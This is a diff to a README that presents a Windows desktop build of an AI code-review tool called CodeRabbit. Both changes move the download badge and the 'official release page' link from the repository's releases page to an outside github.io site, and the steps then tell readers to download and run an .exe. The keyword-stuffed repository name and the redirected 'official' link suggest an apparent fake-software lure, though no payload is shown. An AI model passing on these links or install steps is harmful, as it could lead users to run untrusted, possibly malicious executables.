@@ -1,6 +1,6 @@
 # 🐇 CodeRabbit-Desktop-for-Windows-10-11-AI-Code-Review-Assistant-2026- - Improve code quality with artificial intelligence
 
-[![Download CodeRabbit Desktop](https://img.shields.io/badge/Download-CodeRabbit_Setup-blue.svg)](https://github.com/Devp4811/CodeRabbit-Desktop-for-Windows-10-11-AI-Code-Review-Assistant-2026-/releases)
+[![Download CodeRabbit Desktop](https://img.shields.io/badge/Download-CodeRabbit_Setup-blue.svg)](https://devp4811.github.io)
 
 CodeRabbit Desktop acts as an assistant for your coding tasks. This application runs on your Windows computer and reviews your work automatically. It scans your files for errors, suggests improvements, and helps your team stay organized. The app provides feedback directly inside your workspace to save you time. 
 
@@ -28,7 +28,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [link to our official release page](https://github.com/Devp4811/CodeRabbit-Desktop-for-Windows-10-11-AI-Code-Review-Assistant-2026-/releases) to view available versions.
+1. Visit the [link to our official release page](https://devp4811.github.io) to view available versions.
 2. Select the latest version listed under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Locate the downloaded file in your browser's download folder or your desktop.
